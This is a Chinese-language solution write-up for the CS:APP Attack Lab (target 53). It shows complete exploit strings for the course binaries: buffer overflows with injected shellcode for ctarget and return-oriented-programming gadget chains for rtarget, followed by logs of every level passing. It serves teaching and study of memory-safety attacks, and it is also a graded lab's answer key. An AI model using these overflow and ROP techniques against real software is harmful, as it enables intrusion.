# Attack Lab
This is target 53.


## 1. ctarget 部分
### Level 1
`level 1` 要求我们在 `getbuf` 输入字符串后，利用溢出来重写栈中 `getbuf` 函数返回的地址，让函数调用 `touch1`。
```
0000000000401713 <getbuf>:
  401713:	48 83 ec 38          	sub    $0x38,%rsp
  401717:	48 89 e7             	mov    %rsp,%rdi
  40171a:	e8 3b 02 00 00       	callq  40195a <Gets>
  40171f:	b8 01 00 00 00       	mov    $0x1,%eax
  401724:	48 83 c4 38          	add    $0x38,%rsp
  401728:	c3                   	retq   
```
根据这段汇编代码我们可以确定，`getbuf` 在栈中分配了0x38比特的内存来存储输入的字符串。如果我们输入的字符串长度超过 56，就可以覆盖掉 `getbuf` 的返回地址了，所以，我们只需要把输入的第 56-63 个字符填写为 `touch1` 函数的地址就行了。
需要注意的是，我们输入的字符应该用两位十六进制数来表示，然后通过 `hex2raw` 来将其转换成字符串。另外，我这里数据都是用小端法来保存的，所以低位在前：
```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
29 17 40 00 00 00 00 00 
```

### Level 2
`level 2` 要求我们注入我们自己写的代码，并把程序转移到我们写的代码处运行，也就是执行 `touch2`。
如何通过我们的代码跳转到 `touch2` 函数？
首先，我们需要找到缓冲区的起始地址，在 `getbuf` 处打断点，查看 `$rsp`：
```
(gdb) p $rsp
$1 = (void *) 0x5565fd40
```
可以知道，`0x5565fd40 - 0x38 = 0x5565fd08` 就是缓冲区的起始地址，我们需要和前面的 `level 1` 一样，让缓冲区溢出，56-63 个字符填写为缓冲区的起始地址，另外在缓冲区的起始处注入我们自己写的代码，这样程序才能执行我们想要的结果。
我们注入的代码逻辑应该是：

+ 将 `cookie` 值赋给 `%edi` 作为 `touch2` 函数的参数
+ 将 `touch2` 函数的地址入栈
+ ret，让函数执行 `touch2`

转为汇编就是：
```
movl $0x2a2e4a08, %edi
pushq $0x0000000000401755
ret
```
这里需要用到 `gcc` 内联汇编的方法，编写 `level2.c` :
```
int main(void)
{
	asm
	(
	 "movl $0x2a2e4a08, %edi\n\t"
	 "pushq $0x0000000000401755\n\t"
	 "ret"
	);
	return 0;
}
```
编译并查看其反汇编代码：
```
gcc level2.c -o level2.out
objdump -d level2.out 
```
可以看到我们想要的汇编代码：
```
  4004f1:       bf 08 4a 2e 2a          mov    $0x2a2e4a08,%edi
  4004f6:       68 55 17 40 00          pushq  $0x401755
  4004fb:       c3                      retq
```
那么我们在缓冲区注入字符就是：
```
bf 08 4a 2e 2a 68 55 17 
40 00 c3 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
08 fd 65 55 00 00 00 00
```

### Level 3
`level 3` 要求我们执行 `touch3`，`touch3` 接收的参数是 `cookie` 的字符串的地址。
有了 `level 2` 的经验，我们知道需要在 56-63 个字符填写缓冲区的起始地址，另外在缓冲区的起始处注入我们自己写的代码。我们把 `cookie` 字符串放在第 64-71 个字符，这样，我们注入的代码就是：
```
movl $0x5565fd48, %edi
pushq $0x0000000000401829
ret
```
`0x5565fd08 + 64 = 0x5565fd48` 是 `cookie` 字符串的地址，`0x0000000000401829` 是 `touch3` 函数地址。同样地，用 `gcc` 内联汇编的方法得到汇编代码，最终我们在缓冲区注入字符就是：
```
bf 48 fd 65 55 68 29 18 
40 00 c3 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
08 fd 65 55 00 00 00 00
32 61 32 65 34 61 30 38
```


## 2. rtarget 部分
### Level 2
与之前的 `level 2` 相同，我们需要为 `%rdi` 赋上 `cookie` 值，再跳转到 `touch2` 函数执行，跳转到 `touch2` 只需要将 `touch2` 的入口地址放在最后一个 `gadget` 之后，在它的 `ret` 指令执行之后就会返回到 `touch2` 中。
查看 `farm.s`：
```
000000000000001b <getval_188>:
  1b:	b8 3c cd 58 c3       	mov    $0xc358cd3c,%eax
  20:	c3                   	retq  
```
`58 c3` 对应 `popq %rax`，这条指令的地址是 `0x1b + 3 = 0x1e`。
```
0000000000000028 <setval_279>:
  28:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
  2e:	c3                   	retq   
```
`48 89 c7 c3` 对应 `movq %rax,%rdi`，这条指令的地址是 `0x28 + 2 = 0x30`。
再查看 `rtarget.s`：
```
00000000004018b1 <start_farm>:
  4018b1:	b8 01 00 00 00       	mov    $0x1,%eax
  4018b6:	c3                   	retq   
```
`start_farm` 的起始地址是 `0x4018b1`。所以 `popq %rax` 这条指令最终的地址是 `0x1e + 0x4018b1 = 0x4018cf`；所以 `movq %rax,%rdi` 这条指令最终的地址是 `0x30 + 0x4018b1 = 0x4018e1`。
`level 2(rtarget)` 最终结果为：
```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
cf 18 40 00 00 00 00 00 /* popq %rax */
08 4a 2e 2a 00 00 00 00 /* 将 cookie 存入 %rax */
e1 18 40 00 00 00 00 00 /* movq %rax,%rdi */
55 17 40 00 00 00 00 00 /* 返回到 touch2 */
```

### Level 3
与之前的 `level 3` 相同，需要将 `%rdi` 指向 `cookie` 的字符串表示的首地址。我们需要把 `cookie` 字符串放在高地址，根据 `%rsp` 和偏移量去取地址。
在 `farm.s` 中：
```
0000000000000042 <add_xy>:
  42:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  46:	c3                   	retq   
```
`lea (%rdi,%rsi,1) %rax` 就是 `%rax = %rdi + %rsi`，所以，只要能够让 `%rdi` 和 `%rsi` 其中一个保存 `%rsp`，另一个保存偏移量，就可以计算出 `cookie` 存放的地址，然后 `movq %rax,%rdi` 再调用 `touch3` 就可以了。
所以，分两步走：先保存一个栈顶地址，这里我通过 `%rsp -> %rax -> %rdi` 保存到 `%rdi` 中，再将偏移量通过 `%eax(%rax) -> %ecx -> %edx -> %esi` 保存到 `%esi(%rsi)` 中。注意，偏移量的值需要等所有指令写完后才能确定。
`level 3(rtarget)` 最终结果为：
```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
1e 19 40 00 00 00 00 00 /* movq %rsp,%rax (48 89 e0) */
e1 18 40 00 00 00 00 00 /* movq %rax,%rdi (48 89 c7) */
cf 18 40 00 00 00 00 00 /* popq %rax (58) */
/* %rdi中保存的是 movq %rsp,%rax 这条指令的栈顶地址，所以最终偏移量为 0x48 */
48 00 00 00 00 00 00 00 /* 偏移量 */
58 19 40 00 00 00 00 00 /* movl %eax,%ecx (89 c1) */
7a 19 40 00 00 00 00 00 /* movl %ecx,%edx (89 ca) */
0c 19 40 00 00 00 00 00 /* movl %edx,%esi (89 d6) */
f3 18 40 00 00 00 00 00 /* add_xy */
e1 18 40 00 00 00 00 00 /* movq %rax,%rdi (48 89 c7) */
29 18 40 00 00 00 00 00 /* touch3地址 */
32 61 32 65 34 61 30 38 /* 目标字符串 */
```


## 最终结果
```
[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# ./hex2raw < 2017302580193-ctarget.l1 | ./ctarget
Cookie: 0x2a2e4a08
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# ./hex2raw < 2017302580193-ctarget.l2 | ./ctarget
Cookie: 0x2a2e4a08
Type string:Touch2!: You called touch2(0x2a2e4a08)
Valid solution for level 2 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# ./hex2raw < 2017302580193-ctarget.l3 | ./ctarget
Cookie: 0x2a2e4a08
Type string:Touch3!: You called touch3("2a2e4a08")
Valid solution for level 3 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# ./hex2raw < 2017302580193-rtarget.l1 | ./rtarget
Cookie: 0x2a2e4a08
Type string:Touch2!: You called touch2(0x2a2e4a08)
Valid solution for level 2 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# ./hex2raw < 2017302580193-rtarget.l2 | ./rtarget
Cookie: 0x2a2e4a08
Type string:Touch3!: You called touch3("2a2e4a08")
Valid solution for level 3 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```